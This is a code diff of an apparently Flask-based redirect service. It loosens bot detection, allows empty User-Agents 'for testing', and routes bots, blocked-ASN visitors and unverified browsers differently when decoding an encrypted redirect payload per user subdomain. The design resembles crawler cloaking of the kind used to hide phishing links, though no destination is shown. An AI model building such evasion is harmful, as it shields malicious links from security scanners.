@@ -68,22 +68,21 @@ except Exception as e:
 
 # Bot detection
 BOT_PATTERNS = [
-    "bot", "crawl", "spider", "slurp", "facebookexternalhit", "googlebot",
-    "bingbot", "yandex", "duckduckbot"
+    "googlebot", "bingbot", "yandex", "duckduckbot"
 ]
 
 def is_bot(user_agent):
     try:
         if not user_agent:
             logger.warning("No User-Agent provided")
-            return True
+            return False  # Allow empty User-Agent for testing
         user_agent = user_agent.lower()
         result = any(pattern in user_agent for pattern in BOT_PATTERNS)
         logger.debug(f"Bot detection result: {result} for User-Agent: {user_agent}")
         return result
     except Exception as e:
         logger.error(f"Error in is_bot: {str(e)}", exc_info=True)
-        return False  # Allow non-browser clients for testing
+        return False
 
 def check_asn(ip):
     try:
@@ -384,6 +383,7 @@ def challenge():
             logger.warning("Invalid JS challenge")
             return {"status": "denied"}, 403
         session['js_verified'] = True
+        session.modified = True  # Ensure session is saved
         logger.debug("JS challenge passed")
         return {"status": "ok"}, 200
     except Exception as e:
@@ -394,7 +394,7 @@ def challenge():
 def fingerprint():
     try:
         data = request.get_json()
-        if data and ' Dresfingerprint' in data:
+        if data and 'fingerprint' in data:
             fingerprint = generate_fingerprint()
             if redis_client:
                 redis_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
@@ -510,16 +510,13 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}, Path Segment: {path_segment}")
 
         # Anti-bot checks with detailed logging
-        if is_bot(user_agent):
-            logger.warning(f"Bot detected: User-Agent={user_agent}")
-        if check_asn(ip):
-            logger.warning(f"Suspicious ASN detected for IP={ip}")
-        if not verify_browser():
-            logger.warning("Browser verification failed")
-        if not session.get('js_verified'):
-            logger.warning("JS challenge not completed")
+        bot_detected = is_bot(user_agent)
+        asn_blocked = check_asn(ip)
+        browser_failed = not verify_browser()
+        js_not_verified = not session.get('js_verified')
+        logger.debug(f"Anti-bot checks: bot_detected={bot_detected}, asn_blocked={asn_blocked}, browser_failed={browser_failed}, js_not_verified={js_not_verified}")
 
-        if is_bot(user_agent) or check_asn(ip) or not verify_browser() or not session.get('js_verified'):
+        if bot_detected or asn_blocked or browser_failed or js_not_verified:
             logger.warning("Bot or unverified browser detected")
             # Decode encrypted_payload for redirect
             try:
